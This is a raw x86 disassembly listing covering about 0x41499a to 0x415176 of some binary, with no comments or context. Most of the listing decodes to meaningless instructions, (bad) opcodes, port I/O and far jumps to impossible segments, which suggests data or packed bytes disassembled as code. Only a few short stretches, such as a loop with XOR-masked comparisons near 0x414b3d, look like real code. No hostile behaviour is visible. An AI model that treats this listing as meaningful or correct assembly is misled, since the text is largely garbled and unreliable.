  41499a:	sbb    ch,BYTE PTR [ecx+0x34db916f]
  4149a0:	mov    dl,0x20
  4149a2:	push   esi
  4149a3:	and    eax,0x6a15cbf1
  4149a8:	leave  
  4149a9:	leave  
  4149aa:	lock xor al,0xbe
  4149ad:	(bad)  
  4149ae:	push   ebx
  4149af:	fmulp  st(4),st
  4149b1:	adc    ch,BYTE PTR [ebx+0x519a049c]
  4149b7:	push   0x29
  4149b9:	repnz lahf 
  4149bb:	imul   esi,DWORD PTR [ebx],0xffffff92
  4149be:	cli    
  4149bf:	fimul  WORD PTR [edx-0x36]
  4149c2:	add    dl,BYTE PTR [ebp+0x6f10dc15]
  4149c8:	xlat   BYTE PTR ds:[ebx]
  4149c9:	adc    bh,cl
  4149cb:	dec    esp
  4149cc:	test   al,0xb6
  4149ce:	js     0x414a3c
  4149d0:	xchg   esi,eax
  4149d1:	test   DWORD PTR [eax+edx*2-0x4a],edx
  4149d5:	stc    
  4149d6:	fwait
  4149d7:	call   0xeb27ec0b
  4149dc:	or     ebx,ebp
  4149de:	push   ds
  4149df:	or     eax,0x87938a51
  4149e4:	mov    ebx,0x896f3c09
  4149e9:	sbb    ebx,DWORD PTR [esi]
  4149eb:	cdq    
  4149ec:	out    dx,eax
  4149ed:	cmp    BYTE PTR [eax],ch
  4149ef:	stos   BYTE PTR es:[edi],al
  4149f0:	sbb    eax,0xd077d95
  4149f5:	sbb    ebx,DWORD PTR [ebx+eiz*4+0x64]
  4149f9:	or     eax,esp
  4149fb:	(bad)
  4149ff:	pop    ss
  414a00:	xlat   BYTE PTR ds:[ebx]
  414a01:	mov    esp,0x8fdee567
  414a06:	fstp   TBYTE PTR [ebx]
  414a08:	push   esp
  414a09:	cmc    
  414a0a:	ss (bad) 
  414a0d:	stos   DWORD PTR es:[edi],eax
  414a0e:	sbb    al,0x62
  414a10:	aas    
  414a11:	cmp    eax,0xc65d74f1
  414a16:	mov    ?,WORD PTR ds:0xcb7c7410
  414a1c:	cmp    al,0xa1
  414a1e:	fiadd  WORD PTR [ebx+eax*1]
  414a21:	or     eax,0x4ed90c80
  414a26:	popf   
  414a27:	hlt    
  414a28:	dec    esp
  414a29:	jmp    0xf2a2c035
  414a2e:	leave  
  414a2f:	cmp    esp,DWORD PTR ds:0x2ab90a99
  414a35:	mov    ds:0xddfa82cb,al
  414a3a:	mov    BYTE PTR [ecx+0x5],bh
  414a3d:	mov    dh,0x2c
  414a3f:	gs mov gs,ebp
  414a42:	xor    BYTE PTR [edx+esi*1+0x46],dh
  414a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a47:	shrd   DWORD PTR [ebx+esi*4],esp,0x38
  414a4c:	call   0xc47:0x9a9d6eb3
  414a53:	cs out 0xc6,eax
  414a56:	std    
  414a57:	mov    ebx,0xe3fb093b
  414a5c:	cmp    edx,DWORD PTR [ebx]
  414a5e:	xchg   ebp,eax
  414a5f:	xor    ebx,DWORD PTR [ebx+ebp*4-0x2cf6454d]
  414a66:	das    
  414a67:	sub    DWORD PTR [ebp-0x22],eax
  414a6a:	sti    
  414a6b:	sbb    cl,BYTE PTR [edi-0x2c]
  414a6e:	call   0xa008d8f9
  414a73:	xchg   DWORD PTR [esi-0x6b],esp
  414a76:	pop    ds
  414a77:	jb     0x414abd
  414a79:	test   eax,0xb86b40eb
  414a7e:	jmp    0x414a47
  414a80:	lods   eax,DWORD PTR ds:[esi]
  414a81:	push   edx
  414a82:	and    bh,BYTE PTR [ebx+0x2b2e868]
  414a88:	daa    
  414a89:	jo     0x414a91
  414a8b:	and    eax,0x9e18974a
  414a90:	xor    esi,DWORD PTR [ebx+ecx*2]
  414a93:	dec    edx
  414a94:	fisttp DWORD PTR [edi+0x40]
  414a97:	xor    al,0xf7
  414a99:	pusha  
  414a9a:	cs add eax,0x31f012ef
  414aa0:	inc    ecx
  414aa1:	jae    0x414a3d
  414aa3:	aaa    
  414aa4:	adc    edx,ebx
  414aa6:	or     edi,DWORD PTR [esi+0x7f5cdb80]
  414aac:	cmp    BYTE PTR [edi+0xd],bl
  414aaf:	cmp    ecx,edx
  414ab1:	(bad)  
  414ab2:	jl     0x414a3c
  414ab4:	ret    
  414ab5:	adc    edi,DWORD PTR [eax]
  414ab7:	dec    esp
  414ab8:	ins    BYTE PTR es:[edi],dx
  414ab9:	shld   DWORD PTR [ecx-0x2986d3a9],ebp,cl
  414ac0:	pop    esi
  414ac1:	faddp  st(7),st
  414ac3:	in     al,0xaf
  414ac5:	or     eax,0x950d92c
  414aca:	adc    eax,0x9d3e597c
  414acf:	mov    ds:0x2fd5c135,al
  414ad4:	mov    cl,0x2b
  414ad6:	jecxz  0x414b14
  414ad8:	ds (bad) 
  414ada:	sub    al,0x1f
  414adc:	adc    DWORD PTR [edx+0x57],0x2f
  414ae0:	add    ch,BYTE PTR [ebp-0x1014e12f]
  414ae6:	cld    
  414ae7:	mov    ds:0xdde9e101,eax
  414aec:	add    ecx,DWORD PTR [esi]
  414aee:	fisub  DWORD PTR [ebp-0x3a]
  414af1:	loopne 0x414b2c
  414af3:	add    al,0xf7
  414af5:	pop    ebp
  414af6:	fs xchg edx,eax
  414af8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414af9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414afa:	jmp    0x63c9:0xdeee92b6
  414b01:	cwde   
  414b02:	je     0x414a8c
  414b04:	adc    esi,ebp
  414b06:	cmp    al,0xcc
  414b08:	cmp    BYTE PTR [edi-0x6b],ah
  414b0b:	pop    es
  414b0c:	and    bh,dl
  414b0e:	jecxz  0x414b62
  414b10:	icebp  
  414b11:	lahf   
  414b12:	dec    ebx
  414b13:	retf   0xf948
  414b16:	push   ebp
  414b17:	sbb    al,0x61
  414b19:	retf   0xd488
  414b1c:	fisubr WORD PTR [ecx+0x6da1ed29]
  414b22:	loope  0x414b95
  414b24:	repnz xchg ebx,eax
  414b26:	mov    ebp,DWORD PTR [edx]
  414b28:	dec    edx
  414b29:	or     DWORD PTR ds:0xab2e3d95,edi
  414b2f:	sbb    eax,0x327e340
  414b34:	ret    
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	adc    al,cl
  414bb8:	out    0xb5,eax
  414bba:	pop    ebx
  414bbb:	jnp    0x414c3c
  414bbd:	jo     0x414b78
  414bbf:	jle    0x414c31
  414bc1:	jo     0x414bc5
  414bc3:	mul    ebx
  414bc5:	jae    0x414c16
  414bc7:	xor    esp,edi
  414bc9:	or     al,0xa4
  414bcb:	dec    ebx
  414bcc:	inc    esp
  414bcd:	loopne 0x414b50
  414bcf:	pusha  
  414bd0:	test   eax,0xdcb48a09
  414bd5:	mov    dh,0x48
  414bd7:	mov    DWORD PTR [edx+0x324ffd7b],edi
  414bdd:	sti    
  414bde:	or     al,0xe4
  414be0:	cmp    al,BYTE PTR [edx-0x17]
  414be3:	std    
  414be4:	adc    al,0x7a
  414be6:	int    0x57
  414be8:	jge    0x414c2f
  414bea:	jnp    0x414bb2
  414bec:	(bad)  
  414bed:	inc    DWORD PTR [edx]
  414bef:	popa   
  414bf0:	mov    al,ds:0xa3d52dc
  414bf5:	pop    es
  414bf6:	mov    al,0x67
  414bf8:	inc    edx
  414bf9:	mov    ch,0x71
  414bfb:	rcl    DWORD PTR [ecx+eiz*4-0x39],cl
  414bff:	push   ebx
  414c00:	or     al,0x71
  414c02:	mov    al,0x40
  414c04:	jmp    0x628b20f3
  414c09:	dec    esp
  414c0a:	xor    al,0xb5
  414c0c:	xor    BYTE PTR [ebp+0x48],0x1c
  414c10:	imul   ebx,DWORD PTR [esi-0x7e6a0457],0x9afaf108
  414c1a:	(bad)  
  414c1b:	int    0x0
  414c1d:	(bad)  
  414c1e:	lahf   
  414c1f:	iret   
  414c20:	(bad)  
  414c21:	loop   0x414c3e
  414c23:	xchg   edx,eax
  414c24:	sub    al,0x14
  414c26:	call   0x91f:0x9721ed14
  414c2d:	or     al,0xfb
  414c2f:	xchg   ebx,eax
  414c30:	(bad)  
  414c31:	xor    DWORD PTR [eax+ebp*2],eax
  414c34:	add    ah,cl
  414c36:	push   esi
  414c37:	out    dx,eax
  414c38:	outs   dx,BYTE PTR ds:[esi]
  414c39:	(bad)  
  414c3a:	xlat   BYTE PTR ds:[ebx]
  414c3b:	push   0x26
  414c3d:	pop    esp
  414c3e:	xchg   ebx,eax
  414c3f:	in     eax,dx
  414c40:	fs dec esi
  414c42:	and    dl,al
  414c44:	jno    0x414bf8
  414c46:	mov    esp,0x411c0ca5
  414c4b:	stc    
  414c4c:	repnz inc eax
  414c4e:	sub    ecx,DWORD PTR [edi+0x1d29e75f]
  414c54:	mov    edx,0xbd640d34
  414c59:	nop
  414c5a:	and    DWORD PTR [edx],esp
  414c5c:	pop    eax
  414c5d:	dec    edx
  414c5e:	push   cs
  414c5f:	lock (bad) 
  414c61:	fsubr  QWORD PTR [esi]
  414c63:	mov    ds:0x79d41830,eax
  414c68:	test   BYTE PTR [eax-0x61],cl
  414c6b:	shl    DWORD PTR [edi-0x6c],0x13
  414c6f:	clc    
  414c70:	sahf   
  414c71:	cmp    cl,BYTE PTR [esp+edx*8-0x63]
  414c75:	adc    ch,ah
  414c77:	shr    DWORD PTR [edx],1
  414c79:	cmp    eax,0x8705d5de
  414c7e:	popa   
  414c7f:	xor    al,0x9c
  414c81:	jns    0x414cab
  414c83:	sahf   
  414c84:	inc    ax
  414c86:	stos   BYTE PTR es:[edi],al
  414c87:	mov    DWORD PTR [edx+0x2bfedcf3],ebx
  414c8d:	iret   
  414c8e:	ror    BYTE PTR [ecx+0x28cc57e],1
  414c94:	push   cs
  414c95:	ss jge 0x414cbd
  414c98:	clc    
  414c99:	cmp    al,0x14
  414c9b:	xchg   DWORD PTR [ebx+0x6],ebx
  414c9e:	(bad)  
  414c9f:	mov    ebx,0x6fe8acdd
  414ca4:	xlat   BYTE PTR gs:[ebx]
  414ca6:	cli    
  414ca7:	xchg   esp,eax
  414ca8:	fst    st(4)
  414caa:	retf   0x254e
  414cad:	out    0xa0,eax
  414caf:	sub    al,0xfe
  414cb1:	les    eax,FWORD PTR [eax-0x6b]
  414cb4:	nop
  414cb5:	mov    eax,0xe5c595ef
  414cba:	lds    esp,FWORD PTR ds:[ecx]
  414cbd:	daa    
  414cbe:	fisttp WORD PTR [esi-0x40]
  414cc1:	adc    eax,0xdbd7f26f
  414cc6:	pop    ebx
  414cc7:	or     ebx,ecx
  414cc9:	or     ax,0x70a0
  414ccd:	loope  0x414cd4
  414ccf:	xor    ebx,DWORD PTR [ebp-0x7]
  414cd2:	cmp    dl,BYTE PTR [ebx+0x1aefdbd3]
  414cd8:	jo     0x414c91
  414cda:	or     eax,0x4c162429
  414cdf:	cmp    al,0x60
  414ce1:	cmp    al,bh
  414ce3:	cmp    esp,ebp
  414ce5:	call   0x12463395
  414cea:	xchg   ebp,eax
  414ceb:	mov    esi,0x42fc8190
  414cf0:	in     al,0xc4
  414cf2:	and    bh,BYTE PTR [esi]
  414cf4:	add    BYTE PTR [esp+edi*1],dh
  414cf7:	jecxz  0x414c9f
  414cf9:	xchg   edx,esi
  414cfb:	push   ss
  414cfc:	outs   dx,DWORD PTR ds:[esi]
  414cfd:	ss jne 0x414d10
  414d00:	data16 test BYTE PTR [edx],bl
  414d03:	xchg   ebx,eax
  414d04:	jge    0x414cb9
  414d06:	push   esp
  414d07:	enter  0x9d44,0xc0
  414d0b:	js     0x414cea
  414d0d:	jle    0x414d08
  414d0f:	mov    DWORD PTR [ecx],edi
  414d11:	or     BYTE PTR [ebp-0x35d595ea],dl
  414d17:	ja     0x414d23
  414d19:	xchg   esp,eax
  414d1a:	lods   eax,DWORD PTR ds:[esi]
  414d1b:	mov    ds:0x5084ab91,al
  414d20:	and    al,0x38
  414d22:	and    cl,al
  414d24:	lock jae 0x414d0e
  414d27:	push   edx
  414d28:	cmp    al,0xbc
  414d2a:	cmp    DWORD PTR [ebp+0x7c61b5],edi
  414d30:	mov    al,ds:0x6753d9f8
  414d35:	cmp    DWORD PTR [esi-0x7a],edi
  414d38:	enter  0xf2b,0x5b
  414d3c:	hlt    
  414d3d:	mov    cl,0x68
  414d3f:	mov    cs,WORD PTR [esi+0x26]
  414d42:	lds    ecx,FWORD PTR [ebx+0x34]
  414d45:	lods   al,BYTE PTR ds:[esi]
  414d46:	jle    0x414d15
  414d48:	pop    esp
  414d49:	retf   0x7a7e
  414d4c:	js     0x414d57
  414d4e:	mov    ebp,0xb62b2f4c
  414d53:	adc    DWORD PTR [ebp+0x1fad176f],edx
  414d59:	js     0x414d5d
  414d5b:	pop    esi
  414d5c:	xchg   edx,eax
  414d5d:	xchg   edx,eax
  414d5e:	scas   eax,DWORD PTR es:[edi]
  414d5f:	aaa    
  414d60:	push   es
  414d61:	sbb    eax,0x63
  414d64:	dec    esp
  414d65:	(bad)  
  414d66:	xor    ecx,DWORD PTR ds:0x93c74363
  414d6c:	dec    edi
  414d6d:	or     DWORD PTR [edi],ebp
  414d6f:	push   0x77
  414d71:	push   edi
  414d72:	sub    al,0xd8
  414d74:	sub    al,0x6b
  414d76:	cmp    DWORD PTR [ecx+0x2b32170a],esp
  414d7c:	cld    
  414d7d:	ret    0xf42e
  414d80:	xchg   esp,eax
  414d81:	sbb    DWORD PTR [eax+0x6798820b],ebp
  414d87:	xchg   DWORD PTR [edx+0x5],edi
  414d8a:	pop    esi
  414d8c:	mov    gs,WORD PTR [esi]
  414d8e:	cmp    cl,BYTE PTR [ecx+edi*2+0x68]
  414d92:	out    dx,eax
  414d93:	fdivr  DWORD PTR [esi+0x53553c1a]
  414d99:	mov    ah,0x5f
  414d9b:	xor    BYTE PTR [ebp+0x206e11a5],cl
  414da1:	push   ss
  414da2:	xchg   edi,eax
  414da3:	xchg   DWORD PTR [ebx],ecx
  414da5:	mov    dl,0x3d
  414da7:	dec    edi
  414da8:	cmp    eax,0x5d707b89
  414dad:	jp     0x414d82
  414daf:	mov    esi,0x55726a08
  414db4:	jns    0x414d61
  414db6:	(bad)  
  414db7:	and    eax,0xb0e190c0
  414dbc:	ins    DWORD PTR es:[edi],dx
  414dbd:	xor    BYTE PTR [eax-0x1b],al
  414dc0:	push   eax
  414dc1:	hlt    
  414dc2:	out    dx,al
  414dc3:	sbb    ah,BYTE PTR ds:0x8b014626
  414dc9:	xor    BYTE PTR [ecx+ebp*1+0x5fadbccf],bl
  414dd0:	scas   eax,DWORD PTR es:[edi]
  414dd1:	cmp    BYTE PTR [ecx],ah
  414dd3:	and    bl,BYTE PTR [edx+0x32fde1ad]
  414dd9:	or     BYTE PTR [edi-0x621cc8c3],0x4c
  414de0:	out    dx,eax
  414de1:	dec    edi
  414de2:	jp     0x414d7c
  414de4:	out    0x91,eax
  414de6:	test   BYTE PTR ds:[eax+esi*2-0x5a],ch
  414deb:	inc    edi
  414dec:	or     DWORD PTR [esi-0x73],edi
  414def:	les    ecx,FWORD PTR [edx+0x1e3d0d05]
  414df5:	lods   al,BYTE PTR ds:[esi]
  414df6:	ret    0x2874
  414df9:	adc    al,dh
  414dfb:	jl     0x414e02
  414dfd:	nop
  414dfe:	push   edi
  414dff:	mov    ecx,0xe89b41a1
  414e04:	jmp    0x63ec:0x1b34cb24
  414e0b:	mov    bh,BYTE PTR [esi+eiz*2+0x75f286ab]
  414e12:	imul   ebp,DWORD PTR [esi+0x53d5bd8d],0xfffffff1
  414e19:	and    DWORD PTR [ecx-0x73],0x84e396f3
  414e20:	bound  edx,QWORD PTR [edi+eax*1+0x7d]
  414e24:	ret    0xa18c
  414e27:	pop    edi
  414e28:	outs   dx,DWORD PTR ds:[esi]
  414e29:	mov    edi,0x388cf043
  414e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e2f:	mov    ds:0x6ca9994,eax
  414e34:	add    eax,0x255278f4
  414e39:	leave  
  414e3a:	cmc    
  414e3b:	adc    cl,0xcc
  414e3e:	lods   eax,DWORD PTR ds:[esi]
  414e3f:	dec    ecx
  414e40:	popf   
  414e41:	popf   
  414e42:	stc    
  414e43:	adc    edi,DWORD PTR [ebx]
  414e45:	in     eax,0xc6
  414e47:	dec    esi
  414e48:	fisub  DWORD PTR [edx-0x15]
  414e4b:	mov    eax,0xeae5992b
  414e50:	daa    
  414e51:	jmp    0x4e69:0x9e777510
  414e58:	and    al,0xa3
  414e5a:	xor    esi,DWORD PTR [edx]
  414e5c:	push   0xffffffd6
  414e5e:	mov    esp,0x746603
  414e63:	mov    ds:0x70e694fc,al
  414e68:	ja     0x414e10
  414e6a:	inc    edi
  414e6b:	out    dx,eax
  414e6c:	outs   dx,BYTE PTR ds:[esi]
  414e6d:	add    BYTE PTR gs:[ecx],0x75
  414e71:	sysret 
  414e73:	push   edx
  414e74:	pop    ds
  414e75:	jne    0x414e5b
  414e77:	xchg   edi,eax
  414e78:	xchg   esp,eax
  414e79:	test   DWORD PTR [ecx+0x61dfbadb],0x73340c14
  414e83:	push   edi
  414e84:	std    
  414e85:	retf   
  414e86:	in     eax,0xff
  414e88:	xchg   edi,eax
  414e89:	pop    ecx
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	jp     0x414e5e
  414eae:	sub    edx,DWORD PTR [esi+0x707f78a4]
  414eb4:	mov    ecx,0x5970707e
  414eb9:	push   ebx
  414eba:	pop    esp
  414ebb:	xchg   ebp,eax
  414ebc:	ret    
  414ebd:	adc    eax,0xfd7918cc
  414ec2:	mov    dl,0xa9
  414ec4:	int3   
  414ec5:	xor    BYTE PTR [edi],bh
  414ec7:	inc    edx
  414ec8:	hlt    
  414ec9:	(bad)  
  414eca:	test   eax,0x1d6a457
  414ecf:	pop    eax
  414ed0:	shl    DWORD PTR [ecx+0x4a],1
  414ed3:	repz mov ah,0xaf
  414ed6:	inc    ebx
  414ed7:	repz xor cl,BYTE PTR [ebp+0x378bc96c]
  414ede:	mov    ds:0x844a0493,al
  414ee3:	jp     0x414f41
  414ee5:	shr    BYTE PTR [esi+0x69],cl
  414ee8:	xchg   edx,eax
  414ee9:	mov    ds:0xbd09e9fb,eax
  414eee:	sub    DWORD PTR [ecx],0x26
  414ef1:	jne    0x414ea7
  414ef3:	bound  ebp,QWORD PTR [ebx]
  414ef5:	and    al,0x10
  414ef7:	mov    ?,esi
  414ef9:	call   0xf0c6fa5e
  414efe:	iret   
  414eff:	je     0x414f37
  414f01:	push   edi
  414f02:	xchg   ecx,eax
  414f03:	mov    ecx,0x36aa30c9
  414f08:	mov    dh,0xd4
  414f0a:	pop    edi
  414f0b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  414f0d:	mov    esi,0xeecb007c
  414f12:	lods   al,BYTE PTR ds:[esi]
  414f13:	jecxz  0x414ec2
  414f15:	mov    WORD PTR [ecx+0x1558407e],ss
  414f1b:	pop    es
  414f1c:	in     al,0x3e
  414f1e:	xor    bl,BYTE PTR [eax+0x5392018]
  414f24:	out    0x97,al
  414f26:	mov    ch,BYTE PTR [esi+0x36154cd8]
  414f2c:	sub    al,0x7e
  414f2e:	mov    ?,esi
  414f30:	fdivr  QWORD PTR [ecx+0x51]
  414f33:	fwait
  414f34:	jae    0x414f21
  414f36:	sub    dl,BYTE PTR [ecx+0x25]
  414f39:	dec    esi
  414f3a:	shl    BYTE PTR [eax],cl
  414f3c:	xchg   edi,eax
  414f3e:	dec    edx
  414f3f:	or     eax,0x93d1f307
  414f44:	pusha  
  414f45:	adc    ch,BYTE PTR [edx+esi*4+0x3d6e7217]
  414f4c:	bound  edx,QWORD PTR [eax+0x4e]
  414f4f:	daa    
  414f50:	shl    DWORD PTR ss:[edx+edi*4],cl
  414f54:	outs   dx,BYTE PTR ds:[esi]
  414f55:	dec    esi
  414f56:	je     0x414f6f
  414f58:	or     DWORD PTR [ebx+0x4acd754e],0xd4b70bef
  414f62:	mov    DWORD PTR [ebx],esi
  414f64:	fisubr WORD PTR [ebp+0x5f]
  414f67:	sub    edi,DWORD PTR [eax]
  414f69:	pop    esi
  414f6a:	dec    esi
  414f6b:	bound  esp,QWORD PTR [esi+0x5e758b9c]
  414f71:	cmp    cl,bh
  414f73:	std    
  414f74:	dec    edi
  414f76:	pusha  
  414f77:	in     al,0xdd
  414f79:	cmp    eax,0xf70eea6c
  414f7e:	inc    edi
  414f7f:	jae    0x414f02
  414f81:	and    eax,0xe9cabd99
  414f86:	jmp    0xcd79f5df
  414f8b:	mov    esp,DWORD PTR [eax]
  414f8d:	jle    0x414f4f
  414f8f:	pushf  
  414f90:	mov    ds:0xfecebbab,eax
  414f95:	out    dx,al
  414f96:	add    eax,DWORD PTR [esi-0x29]
  414f99:	stc    
  414f9a:	sub    ch,ch
  414f9c:	or     DWORD PTR ds:0xc993e4ca,esp
  414fa2:	adc    al,0x7e
  414fa5:	mov    ds:0x94c66a42,eax
  414faa:	call   0xa9627bb3
  414faf:	adc    eax,0x9fc8f485
  414fb4:	push   ds
  414fb5:	inc    edx
  414fb6:	xchg   esp,eax
  414fb7:	xor    eax,ecx
  414fb9:	xchg   edi,eax
  414fba:	and    dl,BYTE PTR [esi+0x2a]
  414fbd:	ss xor al,0x3
  414fc0:	rol    ebx,cl
  414fc2:	into   
  414fc3:	ror    BYTE PTR [ebp+edi*4+0x4],cl
  414fc7:	lods   al,BYTE PTR ds:[esi]
  414fc8:	in     al,dx
  414fc9:	loop   0x41503e
  414fcb:	xor    al,0x83
  414fcd:	jmp    0x9ff9:0xda5ef845
  414fd4:	or     DWORD PTR [eax+eax*1],0xffffffa6
  414fd8:	xor    BYTE PTR [edi+0x0],0x85
  414fdc:	and    DWORD PTR ds:0xe6c06200,0x32
  414fe3:	daa    
  414fe4:	pop    es
  414fe5:	nop
  414fe6:	adc    ecx,eax
  414fe8:	sti    
  414fe9:	aas    
  414fea:	jns    0x415052
  414fec:	in     al,0xf9
  414fee:	stos   DWORD PTR es:[edi],eax
  414fef:	sbb    ebx,edx
  414ff1:	out    dx,al
  414ff2:	push   es
  414ff3:	inc    ebx
  414ff4:	push   ecx
  414ff5:	mov    ch,0xe7
  414ff7:	sbb    bl,BYTE PTR [edx-0x13]
  414ffa:	adc    DWORD PTR [edx-0x2c0d6a2f],esp
  415000:	pop    WORD PTR [eax]
  415003:	sub    edi,DWORD PTR [ecx-0x19]
  415006:	dec    ebx
  415007:	sub    DWORD PTR ds:0x81fcafd4,ecx
  41500d:	xchg   DWORD PTR [ecx],esp
  41500f:	inc    eax
  415010:	fisub  WORD PTR [ecx]
  415012:	xor    cl,BYTE PTR [esi-0x3d33f1c9]
  415018:	mov    BYTE PTR [eax],al
  41501a:	or     eax,0x6ca23d37
  41501f:	sub    al,0x24
  415021:	stc    
  415022:	add    dh,bh
  415024:	push   ecx
  415025:	push   edi
  415026:	jmp    0xe275:0x57efb2c7
  41502d:	push   cs
  41502e:	leave  
  41502f:	scas   eax,DWORD PTR es:[edi]
  415030:	fdiv   DWORD PTR [ecx]
  415032:	push   ecx
  415033:	ss push ebp
  415035:	cdq    
  415036:	xchg   esp,eax
  415037:	ror    BYTE PTR [ebx+0x10],cl
  41503a:	shl    ebx,1
  41503c:	imul   DWORD PTR [edx-0x4a77c173]
  415042:	daa    
  415043:	(bad)
  415047:	xor    bh,al
  415049:	or     al,0x7e
  41504b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41504c:	cmp    DWORD PTR [ebp-0x277270],edi
  415052:	or     dl,cl
  415054:	push   ecx
  415055:	ins    BYTE PTR es:[edi],dx
  415056:	pop    edx
  415057:	rcr    DWORD PTR [ecx+eiz*4-0x19d1f36f],1
  41505e:	push   ebx
  41505f:	xchg   ebx,eax
  415060:	and    al,0xec
  415062:	data16 arpl WORD PTR [ebp-0x7cf35ee0],bp
  415069:	sti    
  41506a:	xlat   BYTE PTR ds:[ebx]
  41506b:	(bad)  
  41506c:	outs   dx,BYTE PTR ds:[esi]
  41506d:	ret    0x4d45
  415070:	cdq    
  415071:	popa   
  415072:	cld    
  415073:	jns    0x4150ae
  415075:	pop    esp
  415076:	mov    DWORD PTR [eax+ebx*4+0x73cecb63],edx
  41507d:	imul   ebx,DWORD PTR [edi-0x1047e82f],0xa2809ab6
  415087:	dec    eax
  415088:	xor    al,0xdf
  41508a:	inc    edi
  41508b:	jns    0x415011
  41508d:	shr    DWORD PTR [eax-0x650d3131],1
  415093:	adc    eax,0x22a4eccb
  415098:	int3   
  415099:	and    eax,0x48fa6f4e
  41509e:	sbb    ebp,esp
  4150a0:	popa   
  4150a1:	xor    dh,dl
  4150a3:	pop    esp
  4150a4:	rcr    DWORD PTR [eax+ecx*2-0x71],0x48
  4150a9:	jecxz  0x4150af
  4150ab:	mov    ebp,0x9ddf8e5
  4150b0:	fbld   TBYTE PTR [edi-0x78]
  4150b3:	xchg   esp,eax
  4150b4:	mov    ds:0x93d79dfb,al
  4150b9:	mov    bl,0xf0
  4150bb:	or     dl,al
  4150bd:	arpl   WORD PTR [edx-0x53fb7c4d],di
  4150c3:	inc    eax
  4150c4:	loopne 0x415059
  4150c6:	out    dx,eax
  4150c7:	in     al,0xba
  4150c9:	mov    ds:0x7c7c5960,eax
  4150ce:	mov    cl,0x9f
  4150d0:	inc    BYTE PTR [ecx+0x7e703422]
  4150d6:	lods   al,BYTE PTR ds:[esi]
  4150d7:	aam    0x2b
  4150d9:	add    al,0xf2
  4150db:	sub    edi,esi
  4150dd:	aaa    
  4150de:	lahf   
  4150df:	rcl    DWORD PTR [edx-0x75],cl
  4150e2:	dec    ebx
  4150e3:	sti    
  4150e4:	cmp    BYTE PTR [ecx-0x36f7216f],cl
  4150ea:	xchg   DWORD PTR [esi],eax
  4150ec:	sbb    cl,BYTE PTR [esi-0x8]
  4150ef:	lahf   
  4150f0:	dec    edi
  4150f1:	mov    dh,0xf5
  4150f3:	or     ecx,edi
  4150f5:	cdq    
  4150f6:	es inc esi
  4150f8:	jle    0x41510e
  4150fa:	xor    DWORD PTR [edi+0x76],eax
  4150fd:	sbb    DWORD PTR [eax],ebp
  4150ff:	xchg   ebp,eax
  415100:	(bad)  
  415101:	or     al,0x41
  415103:	sbb    esi,esi
  415105:	pop    ebx
  415106:	sbb    eax,0x5bf16330
  41510b:	adc    dl,ch
  41510d:	in     eax,dx
  41510e:	adc    dh,BYTE PTR [edi+0x30536c88]
  415114:	and    esi,edi
  415116:	sti    
  415117:	cmp    dh,BYTE PTR [ecx+0x3e]
  41511a:	jae    0x415107
  41511c:	shl    DWORD PTR [ebx-0x799b3eb4],cl
  415122:	add    al,0x12
  415124:	add    BYTE PTR [esi+0x258780],bl
  41512a:	dec    esi
  41512b:	sub    ebp,DWORD PTR [esi]
  41512d:	mov    esi,0x131cb1de
  415132:	sub    dh,BYTE PTR ds:[ebx+0x2f]
  415136:	mov    ebp,0x338813f0
  41513b:	shr    BYTE PTR [ebx],cl
  41513d:	(bad)  
  41513e:	std    
  41513f:	cmp    al,BYTE PTR [ecx-0x768724f7]
  415145:	jmp    0x71c4:0xc290c367
  41514c:	std    
  41514d:	fild   WORD PTR [eax+0x8]
  415150:	push   ecx
  415151:	(bad)  
  415152:	cmp    edi,ebx
  415154:	test   eax,0xd4764d6c
  415159:	xlat   BYTE PTR fs:[ebx]
  41515b:	jge    0x415138
  41515d:	pop    esp
  41515e:	ins    DWORD PTR es:[edi],dx
  41515f:	mov    al,ds:0x689457b9
  415164:	mov    edi,0x99b384bc
  415169:	sbb    DWORD PTR [ebp+0x4],ebp
  41516c:	adc    DWORD PTR [edi+0x46],0xffffffdd
  415170:	jge    0x41517e
  415172:	mov    ch,0x1e
  415174:	jge    0x415108
  415176:	pop    ds
